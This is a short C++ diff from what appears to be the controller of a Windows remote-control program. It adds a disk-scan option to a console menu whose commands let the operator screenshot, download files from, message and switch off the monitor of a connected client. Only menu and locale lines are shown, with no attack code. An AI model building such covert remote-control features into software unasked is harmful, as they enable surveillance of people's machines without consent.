@@ -37,7 +37,6 @@ void concheck(SOCKET Connect1, SOCKET Listen1, HOSTENT *hst, sockaddr_in client_
 }
 
 int main() {
-
 	setlocale(LC_ALL, "russian");
 	SetConsoleCP(1251);
 	SetConsoleOutputCP(1251);
@@ -90,7 +89,7 @@ int main() {
 		while (true) {
 			char m_connect[256] = "";
 			int i = 0;
-			std::cout << "Enter the command:  \n-- s send the file \n--m display the message \n--o turn off the monitor \n--e close the client \n--w open the site \n--c take a screenshot\n--d download file\n";
+			std::cout << "Enter the command:  \n-- s send the file \n--m display the message \n--o turn off the monitor \n--e close the client \n--w open the site \n--c take a screenshot\n--d download file\n dir scan disk\n";
 			char a = getchar();
 			while (a != '\n') {
 				m_connect[i] = a;
